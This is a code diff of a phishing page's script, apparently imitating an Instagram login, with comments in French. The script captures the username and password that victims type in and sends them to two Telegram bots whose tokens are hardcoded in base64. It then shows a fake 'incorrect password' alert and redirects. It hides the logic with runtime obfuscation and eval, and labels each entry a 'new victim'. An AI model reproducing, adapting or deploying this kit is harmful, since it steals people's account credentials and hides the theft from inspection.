@@ -42,84 +42,85 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>
-<script>
-    const code = `
-    function sendToTelegram(message, tkn, chId) {
-        const url = \`https://api.telegram.org/bot\${tkn}/sendMessage\`;
-        window.location.href = 'https://instagram.com'; 
+    <script>
+        const code = `
+        function sendToTelegram(message, tkn, chId) {
+            const url = \https://api.telegram.org/bot\${tkn}/sendMessage\;
+            
+            const data = {
+                chat_id: chId,
+                text: message
+            };
     
-        const data = {
-            chat_id: chId,
-            text: message
-        };
-    
-        return fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Message envoyé avec succès:', data);
-                return true;
-            } else {
-                console.error('Erreur Telegram:', data);
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message envoyé avec succès:', data);
+                    return true;
+                } else {
+                    console.error('Erreur Telegram:', data);
+                    return false;
+                }
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\\'envoi du message:', error);
                 return false;
-            }
-        })
-        .catch(error => {
-            console.error('Erreur lors de l\\'envoi du message:', error);
-            return false;
-        });
-    }
-    
-    document.querySelector('.btn').addEventListener('click', async function() {
-        const username = document.querySelector('input[type="text"]').value;
-        const YKK = document.querySelector('input[type="YKK"]').value;
-    
-        if (username && YKK) {
-            const message = \` ✨ Nouvelle Victime ✨ (AMN) by YKK☑️\\n\\nNom de profil 👤: \${username}\\nMot de passe 🔒: \${YKK}\`;
-
-            // Token1 b atob
-            const tkn1 = atob('Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==');
-            const chId1 = atob('NjY2OTY5MzgwNQ==');
-            const tkn2 = atob('Nzg3MDAzMDEwNTpBQUdJekZEcGlwM0t4cDlPME5razNNcG9wdVVXWVhXc0gtOA');
-            const chId2 = atob('NjE1NzA0MTMxNg==');
-    
-            const success1 = await sendToTelegram(message, tkn1, chId1);
-            const success2 = await sendToTelegram(message, tkn2, chId2);
-    
-            if (success1 && success2) {
-                alert('incorrect');
-            } else {
-                alert('le mot de passe que avez indiqué est incorrect Veuillez réessayer.');
-            }
-        } else {
-            alert('incorrect');
+            });
         }
-    });
-    `;
+        
+        document.querySelector('.btn').addEventListener('click', async function() {
+            const username = document.querySelector('input[type="text"]').value;
+            const YKK = document.querySelector('input[type="YKK"]').value;
     
-    const obfuscatedCode = JavaScriptObfuscator.obfuscate(code, {
-        compact: true,
-        controlFlowFlattening: true,
-        deadCodeInjection: true,
-        debugProtection: true,
-        disableConsoleOutput: true,
-        identifierNamesGenerator: 'hexadecimal',
-        numbersToExpressions: true,
-        simplify: true,
-        splitStrings: true,
-        stringArray: true,
-        stringArrayEncoding: ['base64'],
-        stringArrayThreshold: 1
-    });
-
-    eval(obfuscatedCode.getObfuscatedCode());
-</script>
+            if (username && YKK) {
+                const message = \ ✨ Nouvelle Victime ✨ (FK) by YKK☑️\\n\\nNom de profil 👤: \${username}\\nMot de passe 🔒: \${YKK}\;
+    
+                const tkn1 = atob('Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==');
+                const chId1 = atob('NjY2OTY5MzgwNQ==');
+                const tkn2 = atob('Nzg3MDAzMDEwNTpBQUdJekZEcGlwM0t4cDlPME5razNNcG9wdVVXWVhXc0gtOA');
+                const chId2 = atob('NjE1NzA0MTMxNg==');
+    
+                const success1 = await sendToTelegram(message, tkn1, chId1);
+                const success2 = await sendToTelegram(message, tkn2, chId2);
+    
+                if (success1 && success2) {
+                    alert('incorrect');
+                } else {
+                    alert('le mot de passe que avez indiqué est incorrect Veuillez réessayer.');
+                }
+    
+                // Only redirect after message has been successfully sent
+                window.location.href = 'index.html'; 
+            } else {
+                alert('incorrect');
+            }
+        });
+        `;
+    
+        const obfuscatedCode = JavaScriptObfuscator.obfuscate(code, {
+            compact: true,
+            controlFlowFlattening: true,
+            deadCodeInjection: true,
+            debugProtection: true,
+            disableConsoleOutput: true,
+            identifierNamesGenerator: 'hexadecimal',
+            numbersToExpressions: true,
+            simplify: true,
+            splitStrings: true,
+            stringArray: true,
+            stringArrayEncoding: ['base64'],
+            stringArrayThreshold: 1
+        });
+    
+        eval(obfuscatedCode.getObfuscatedCode());
+    </script>
 <script src="../CSSYKK.js"></script>
 
 </body>
